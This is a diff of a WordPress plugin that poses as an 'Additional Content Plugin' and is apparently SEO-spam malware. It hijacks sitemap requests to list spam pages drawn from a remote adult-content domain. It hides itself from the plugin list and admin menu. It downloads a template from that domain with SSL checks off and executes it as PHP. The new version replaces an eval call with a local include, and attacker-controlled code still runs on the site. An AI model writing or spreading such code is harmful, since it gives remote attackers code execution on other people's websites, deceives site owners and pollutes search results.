@@ -1,8 +1,8 @@
 <?php
 /*
 Plugin Name: Additional Content Plugin
-Description: Plugin konten & sitemap stealth dengan Sitemap Index (jav.xml) dan Prioritas Nuklir.
-Version: 7.0
+Description: Plugin konten & sitemap stealth dengan metode Native Include (Max Performance).
+Version: 7.2
 Author: Grok
 */
 
@@ -11,42 +11,43 @@ if (!defined('ABSPATH')) {
     exit;
 }
 
-// KONFIGURASI URL DEFAULT
+// KONFIGURASI URL
 define('ACP_TEMPLATE_URL', 'https://player.javpornsub.net/template/index.txt');
 define('ACP_JSON_BASE_URL', 'https://player.javpornsub.net/content/');
-define('ACP_MAX_URLS_PER_SITEMAP', 10000); // Batas 10k per file
-define('ACP_MAIN_SITEMAP', 'jav.xml'); // Nama sitemap induk
+define('ACP_MAX_URLS_PER_SITEMAP', 10000);
+define('ACP_MAIN_SITEMAP', 'jav.xml');
+
+// SETUP STORAGE
+function acp_get_storage_dir() {
+    $upload = wp_upload_dir();
+    return $upload['basedir'] . '/acp-storage';
+}
 
 // ==========================================
-// 1. SUPER EARLY INTERCEPT (SITEMAP HANDLER)
+// 1. SITEMAP HANDLER (NUCLEAR INTERCEPT)
 // ==========================================
 add_action('plugins_loaded', 'acp_nuclear_intercept', -9999);
 function acp_nuclear_intercept() {
-    // Cek jika request mengandung .xml
     if (isset($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], '.xml') !== false) {
-        
         $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
-        $filename = basename($path); // misal: jav.xml atau sasas.xml atau sasas-2.xml
+        $filename = basename($path);
         
-        // --- A. HANDLE SITEMAP INDEX (jav.xml) ---
+        // A. SITEMAP INDEX
         if ($filename === ACP_MAIN_SITEMAP) {
             acp_render_sitemap_index();
             exit;
         }
 
-        // --- B. HANDLE CHILD SITEMAPS ---
-        // Bersihkan nama file
+        // B. CHILD SITEMAP
         $filename_no_ext = str_replace('.xml', '', $filename);
         $sitemap_name = $filename_no_ext;
         $page = 1;
 
-        // Cek pola pagination (nama-2)
         if (preg_match('/^(.*?)-(\d+)$/', $filename_no_ext, $matches)) {
             $sitemap_name = $matches[1];
             $page = intval($matches[2]);
         }
 
-        // Cari endpoint aktif
         $endpoints = get_option('acp_endpoints', []);
         if (empty($endpoints)) return;
 
@@ -58,7 +59,6 @@ function acp_nuclear_intercept() {
             }
         }
 
-        // Jika ketemu endpoint yang cocok, render isinya
         if ($target_endpoint) {
             acp_render_child_sitemap($target_endpoint, $page);
             exit;
@@ -66,7 +66,6 @@ function acp_nuclear_intercept() {
     }
 }
 
-// FUNGSI RENDER SITEMAP INDEX (jav.xml)
 function acp_render_sitemap_index() {
     if (!headers_sent()) {
         header('HTTP/1.1 200 OK');
@@ -81,28 +80,19 @@ function acp_render_sitemap_index() {
     foreach ($endpoints as $ep) {
         if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
 
-        // Kita harus hitung jumlah URL di JSON untuk tahu butuh berapa pecahan file
-        $total_urls = acp_get_json_count($ep['json_filename']);
+        $total_urls = acp_get_local_json_count($ep['json_filename']);
         $total_pages = ceil($total_urls / ACP_MAX_URLS_PER_SITEMAP);
-        
         if ($total_pages < 1) $total_pages = 1;
 
-        // Loop untuk membuat entry sitemap anak
         for ($i = 1; $i <= $total_pages; $i++) {
             $suffix = ($i === 1) ? '' : '-' . $i;
             $loc = home_url($ep['sitemap_name'] . $suffix . '.xml');
-            
-            echo "\t<sitemap>\n";
-            echo "\t\t<loc>" . esc_url($loc) . "</loc>\n";
-            echo "\t\t<lastmod>" . date('c') . "</lastmod>\n";
-            echo "\t</sitemap>\n";
+            echo "\t<sitemap>\n\t\t<loc>" . esc_url($loc) . "</loc>\n\t\t<lastmod>" . date('c') . "</lastmod>\n\t</sitemap>\n";
         }
     }
-
     echo '</sitemapindex>';
 }
 
-// FUNGSI RENDER CHILD SITEMAP (isi konten)
 function acp_render_child_sitemap($endpoint, $page) {
     if (!headers_sent()) {
         header('HTTP/1.1 200 OK');
@@ -110,8 +100,7 @@ function acp_render_child_sitemap($endpoint, $page) {
         header('X-Robots-Tag: noindex, follow');
     }
 
-    $json_url = ACP_JSON_BASE_URL . $endpoint['json_filename'] . '.json';
-    $konten_data = acp_fetch_json($json_url);
+    $konten_data = acp_get_local_json($endpoint['json_filename']);
 
     echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
     echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
@@ -122,50 +111,62 @@ function acp_render_child_sitemap($endpoint, $page) {
 
         if (isset($chunks[$chunk_index])) {
             foreach ($chunks[$chunk_index] as $title => $desc) {
-                echo "\t<url>\n";
-                echo "\t\t<loc>" . esc_url(home_url(urlencode($title))) . "</loc>\n";
-                echo "\t\t<lastmod>" . date('c') . "</lastmod>\n";
-                echo "\t\t<changefreq>weekly</changefreq>\n";
-                echo "\t</url>\n";
+                echo "\t<url>\n\t\t<loc>" . esc_url(home_url(urlencode($title))) . "</loc>\n\t\t<lastmod>" . date('c') . "</lastmod>\n\t\t<changefreq>weekly</changefreq>\n\t</url>\n";
             }
         }
-    } else {
-        echo "";
     }
-    
     echo '</urlset>';
 }
 
-// HELPER: Fetch & Cache JSON (Return Array)
-function acp_fetch_json($url) {
-    // Bypass SSL verify for speed/compatibility
-    $response = wp_remote_get($url, ['timeout' => 30, 'sslverify' => false]);
-    if (!is_wp_error($response)) {
-        $body = wp_remote_retrieve_body($response);
-        $data = json_decode($body, true);
-        if (is_array($data)) return $data;
+// ==========================================
+// 2. HELPER (LOCAL FILE)
+// ==========================================
+
+function acp_download_and_save_files() {
+    $storage_dir = acp_get_storage_dir();
+    if (!file_exists($storage_dir)) {
+        wp_mkdir_p($storage_dir);
+        file_put_contents($storage_dir . '/.htaccess', 'deny from all');
+    }
+
+    // Download Template
+    $tpl = wp_remote_get(ACP_TEMPLATE_URL, ['timeout' => 30, 'sslverify' => false]);
+    if (!is_wp_error($tpl)) {
+        $body = wp_remote_retrieve_body($tpl);
+        if (!empty($body)) file_put_contents($storage_dir . '/template.txt', $body);
+    }
+
+    // Download JSONs
+    $endpoints = get_option('acp_endpoints', []);
+    $count = 0;
+    foreach ($endpoints as $ep) {
+        $json_url = ACP_JSON_BASE_URL . $ep['json_filename'] . '.json';
+        $res = wp_remote_get($json_url, ['timeout' => 60, 'sslverify' => false]);
+        if (!is_wp_error($res)) {
+            $body = wp_remote_retrieve_body($res);
+            if (json_decode($body)) {
+                file_put_contents($storage_dir . '/' . $ep['json_filename'] . '.json', $body);
+                $count++;
+            }
+        }
+    }
+    return $count;
+}
+
+function acp_get_local_json($filename) {
+    $path = acp_get_storage_dir() . '/' . $filename . '.json';
+    if (file_exists($path)) {
+        return json_decode(file_get_contents($path), true);
     }
     return [];
 }
 
-// HELPER: Get JSON Count (Cached separately to avoid heavy load on Index)
-function acp_get_json_count($filename) {
-    $cache_key = 'acp_cnt_' . md5($filename);
-    $count = get_transient($cache_key);
-    
-    if ($count === false) {
-        $data = acp_fetch_json(ACP_JSON_BASE_URL . $filename . '.json');
-        $count = count($data);
-        // Cache count selama 12 jam agar jav.xml ringan
-        set_transient($cache_key, $count, 12 * HOUR_IN_SECONDS);
-    }
-    
-    return intval($count);
+function acp_get_local_json_count($filename) {
+    return count(acp_get_local_json($filename));
 }
 
-
 // ==========================================
-// 2. FITUR STEALTH & ADMIN
+// 3. ADMIN PAGE
 // ==========================================
 
 add_filter('all_plugins', 'acp_hide_plugin_from_list');
@@ -180,9 +181,7 @@ function acp_hide_plugin_from_list($plugins) {
 add_action('admin_menu', 'acp_admin_menu', 999);
 function acp_admin_menu() {
     add_menu_page('Content Plugin', 'Content Plugin', 'manage_options', 'additional-content-plugin', 'acp_admin_page', 'dashicons-database');
-    if (get_option('acp_plugin_hidden', false)) {
-        remove_menu_page('additional-content-plugin');
-    }
+    if (get_option('acp_plugin_hidden', false)) remove_menu_page('additional-content-plugin');
 }
 
 function acp_generate_random_string($length = 5) {
@@ -190,45 +189,32 @@ function acp_generate_random_string($length = 5) {
 }
 
 function acp_admin_page() {
-    // Toggle Visibility
     if (isset($_POST['acp_toggle_visibility'])) {
         check_admin_referer('acp_action');
         $curr = get_option('acp_plugin_hidden', false);
         update_option('acp_plugin_hidden', !$curr);
     }
-    // Setup Endpoints
     if (isset($_POST['acp_setup_endpoints'])) {
         check_admin_referer('acp_action');
         $count = intval($_POST['endpoint_count']);
         if ($count > 0) {
             $new = [];
             for ($i = 0; $i < $count; $i++) {
-                $new[] = [
-                    'json_filename' => acp_generate_random_string(10),
-                    'sitemap_name'  => acp_generate_random_string(5),
-                    'status'        => 'pending'
-                ];
+                $new[] = ['json_filename' => acp_generate_random_string(10), 'sitemap_name' => acp_generate_random_string(5), 'status' => 'pending'];
             }
             update_option('acp_endpoints', $new);
         }
     }
-    // Generate Action
     if (isset($_POST['acp_generate_action'])) {
         check_admin_referer('acp_action');
+        acp_download_and_save_files();
         $endpoints = get_option('acp_endpoints', []);
-        
-        // Hapus cache count lama saat generate ulang agar akurat
-        foreach ($endpoints as $ep) {
-            delete_transient('acp_cnt_' . md5($ep['json_filename']));
-        }
-
         foreach ($endpoints as &$ep) {
-            $ep['status'] = 'active';
+            $ep['status'] = file_exists(acp_get_storage_dir() . '/' . $ep['json_filename'] . '.json') ? 'active' : 'error';
         }
         update_option('acp_endpoints', $endpoints);
-        echo '<div class="updated"><p><strong>Sitemap Index (jav.xml) berhasil diperbarui!</strong></p></div>';
+        echo '<div class="updated"><p>Download selesai & Sitemap Updated.</p></div>';
     }
-    // Reset
     if (isset($_POST['acp_reset'])) {
         check_admin_referer('acp_action');
         delete_option('acp_endpoints');
@@ -239,97 +225,58 @@ function acp_admin_page() {
     $main_sitemap_url = home_url(ACP_MAIN_SITEMAP);
     ?>
     <div class="wrap">
-        <h1>Content Plugin (V7.0 Sitemap Index)</h1>
+        <h1>Content Plugin (V7.2 Native Include)</h1>
+        <?php if ($is_hidden): ?><div class="notice notice-error"><p>MODE STEALTH AKTIF</p></div><?php endif; ?>
         
-        <?php if ($is_hidden): ?>
-            <div class="notice notice-error" style="padding:10px;">
-                <strong>MODE STEALTH AKTIF!</strong> Menu admin disembunyikan.
-            </div>
-        <?php endif; ?>
-
         <div style="background:#fff; padding:15px; border-left:4px solid #00a0d2; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
             <div>Status: <strong><?php echo $is_hidden ? '<span style="color:red">HIDDEN</span>' : '<span style="color:green">VISIBLE</span>'; ?></strong></div>
-            <form method="post">
-                <?php wp_nonce_field('acp_action'); ?>
-                <input type="submit" name="acp_toggle_visibility" class="button" value="<?php echo $is_hidden ? 'Unhide Plugin' : 'Hide Plugin'; ?>">
-            </form>
+            <form method="post"><?php wp_nonce_field('acp_action'); ?><input type="submit" name="acp_toggle_visibility" class="button" value="<?php echo $is_hidden ? 'Unhide' : 'Hide'; ?>"></form>
         </div>
 
         <?php if (!$endpoints): ?>
             <div class="card" style="max-width:400px; padding:20px;">
-                <h3>Setup Awal</h3>
-                <form method="post">
-                    <?php wp_nonce_field('acp_action'); ?>
-                    <p>Jumlah JSON: <input type="number" name="endpoint_count" value="3" class="small-text"></p>
-                    <input type="submit" name="acp_setup_endpoints" class="button button-primary" value="Siapkan Endpoint">
-                </form>
+                <form method="post"><?php wp_nonce_field('acp_action'); ?>
+                <p>Jumlah JSON: <input type="number" name="endpoint_count" value="3" class="small-text"></p>
+                <input type="submit" name="acp_setup_endpoints" class="button button-primary" value="Setup"></form>
             </div>
         <?php else: ?>
-            
             <div style="background:#e7f5fe; padding:20px; margin-bottom:20px; border:1px solid #00a0d2; border-radius:5px; text-align:center;">
                 <h2>Sitemap Utama (Index)</h2>
-                <p>Submit URL ini ke Google Search Console. URL ini otomatis berisi link ke semua file XML anak.</p>
-                
-                <div style="display:flex; justify-content:center; align-items:center; gap:10px; margin-top:15px;">
-                    <input type="text" id="main_sitemap_input" value="<?php echo esc_attr($main_sitemap_url); ?>" class="regular-text" style="width:400px; text-align:center; font-weight:bold; font-size:16px; padding:10px;" readonly>
-                    <button type="button" class="button button-primary button-hero acp-copy" data-target="main_sitemap_input">COPY URL</button>
+                <div style="display:flex; justify-content:center; gap:10px;">
+                    <input type="text" id="ms" value="<?php echo esc_attr($main_sitemap_url); ?>" class="regular-text" style="width:400px;text-align:center;" readonly>
+                    <button type="button" class="button button-primary acp-copy" data-target="ms">COPY</button>
                 </div>
-                <br>
-                <a href="<?php echo esc_url($main_sitemap_url); ?>" target="_blank">Lihat jav.xml (Preview)</a>
+                <br><a href="<?php echo esc_url($main_sitemap_url); ?>" target="_blank">Lihat jav.xml</a>
             </div>
 
-            <form method="post">
-                <?php wp_nonce_field('acp_action'); ?>
-                <h3>Daftar File JSON</h3>
+            <form method="post"><?php wp_nonce_field('acp_action'); ?>
                 <table class="wp-list-table widefat fixed striped">
-                    <thead><tr><th width="50">No</th><th>Nama File JSON</th><th>Status</th></tr></thead>
+                    <thead><tr><th>No</th><th>File JSON</th><th>Status Lokal</th></tr></thead>
                     <tbody>
-                        <?php foreach ($endpoints as $i => $ep): 
-                            $is_active = isset($ep['status']) && $ep['status'] === 'active';
-                        ?>
+                        <?php foreach ($endpoints as $i => $ep): $st = isset($ep['status']) ? $ep['status'] : 'pending'; ?>
                         <tr>
                             <td><?php echo $i + 1; ?></td>
+                            <td><input type="text" value="<?php echo $ep['json_filename']; ?>" class="regular-text" style="width:150px;" readonly> .json</td>
                             <td>
-                                <input type="text" value="<?php echo $ep['json_filename']; ?>" class="regular-text" style="width:200px;" readonly onclick="this.select()"> .json
-                                <br><small style="color:#666">Upload ke: <?php echo ACP_JSON_BASE_URL . $ep['json_filename']; ?>.json</small>
-                            </td>
-                            <td>
-                                <?php if ($is_active): ?>
-                                    <span style="color:green; font-weight:bold;">AKTIF</span>
-                                <?php else: ?>
-                                    <span style="color:#999;">Menunggu Generate...</span>
-                                <?php endif; ?>
+                                <?php if ($st == 'active') echo '<strong style="color:green">OK (Tersimpan)</strong>'; 
+                                      elseif ($st == 'error') echo '<strong style="color:red">GAGAL</strong>';
+                                      else echo '<span style="color:#888">Belum Download</span>'; ?>
                             </td>
                         </tr>
                         <?php endforeach; ?>
                     </tbody>
                 </table>
-                <p class="submit"><input type="submit" name="acp_generate_action" class="button button-primary button-hero" value="GENERATE SITEMAP INDEX (jav.xml)"></p>
+                <p class="submit"><input type="submit" name="acp_generate_action" class="button button-primary button-hero" value="DOWNLOAD & GENERATE"></p>
             </form>
-            <hr>
-            <form method="post" onsubmit="return confirm('Reset?');">
-                <?php wp_nonce_field('acp_action'); ?>
-                <input type="submit" name="acp_reset" class="button button-link-delete" value="Reset Konfigurasi">
-            </form>
+            <form method="post" onsubmit="return confirm('Reset?');"><?php wp_nonce_field('acp_action'); ?><input type="submit" name="acp_reset" class="button button-link-delete" value="Reset"></form>
         <?php endif; ?>
     </div>
-    <script>
-    jQuery(document).ready(function($){
-        $('.acp-copy').click(function(){
-            var t = document.getElementById($(this).data('target'));
-            t.select(); document.execCommand('copy');
-            var btn = $(this);
-            var originalText = btn.text();
-            btn.text('COPIED!');
-            setTimeout(function(){ btn.text(originalText); }, 2000);
-        });
-    });
-    </script>
+    <script>jQuery(document).ready(function($){$('.acp-copy').click(function(){var t=document.getElementById($(this).data('target'));t.select();document.execCommand('copy');alert('Copied!');});});</script>
     <?php
 }
 
 // ==========================================
-// 3. CONTENT HANDLER (Rewrite Rule)
+// 4. CONTENT HANDLER (INCLUDE MODE)
 // ==========================================
 add_action('init', 'acp_register_rewrite_rules');
 function acp_register_rewrite_rules() {
@@ -342,40 +289,31 @@ function acp_display_content() {
     $val = get_query_var('acp_value');
     if (!$val) {
         $path = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
-        if (!empty($path) && !is_admin() && !get_page_by_path($path)) {
-             $val = $path;
-        } else {
-            return;
-        }
+        if (!empty($path) && !is_admin() && !get_page_by_path($path)) $val = $path;
+        else return;
     }
     $title = sanitize_text_field(urldecode($val));
     if (get_page_by_path($title, OBJECT, ['post', 'page'])) return;
+
+    // Cek Template Lokal
+    $template_path = acp_get_storage_dir() . '/template.txt';
+    if (!file_exists($template_path)) return; // Stop jika template belum didownload
 
     $endpoints = get_option('acp_endpoints', []);
     foreach ($endpoints as $ep) {
         if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
         
-        $json_url = ACP_JSON_BASE_URL . $ep['json_filename'] . '.json';
-        $cache_key = 'acp_c_' . md5($json_url);
-        $data = get_transient($cache_key);
-        if ($data === false) {
-            $resp = wp_remote_get($json_url, ['timeout'=>10, 'sslverify'=>false]);
-            if (!is_wp_error($resp)) {
-                $data = json_decode(wp_remote_retrieve_body($resp), true);
-                set_transient($cache_key, $data, 3600);
-            }
-        }
+        // Cek JSON Lokal
+        $data = acp_get_local_json($ep['json_filename']);
         if (is_array($data)) {
             foreach ($data as $k => $v) {
                 if (strtolower($k) === strtolower($title)) {
-                    $additional_content = $v;
-                    $tpl = wp_remote_get(ACP_TEMPLATE_URL, ['sslverify'=>false]);
-                    if (!is_wp_error($tpl)) {
-                        ob_start();
-                        eval('?>' . wp_remote_retrieve_body($tpl));
-                        echo ob_get_clean();
-                        exit;
-                    }
+                    $additional_content = $v; // Variabel ini akan dibaca oleh file template di bawah
+                    
+                    // GANTI EVAL DENGAN INCLUDE
+                    // Jauh lebih cepat & aman
+                    include $template_path;
+                    exit;
                 }
             }
         }
